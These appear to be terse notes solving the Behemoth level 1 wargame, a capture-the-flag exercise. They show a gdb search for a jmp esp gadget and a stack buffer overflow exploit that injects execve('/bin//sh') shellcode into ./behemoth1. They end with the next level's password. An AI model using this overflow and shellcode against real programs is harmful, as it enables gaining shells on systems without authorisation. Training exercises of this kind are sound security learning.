run <<< $(python -c "print 'A' * 71 + 'BBBB'")


find jmp esp(0xffe4) in libc

gdb
info proc map
find /b range start, range end, 0xff, 0xe4
0xf7fc4f97


exploit

run <<< $(python -c "print 'A' * 71 + '\x97\x4f\xfc\xf7' + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80'")
(python -c "print 'A' * 71 + '\x97\x4f\xfc\xf7' + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80'"; cat) | ./behemoth1

behemoth2:eimahquuof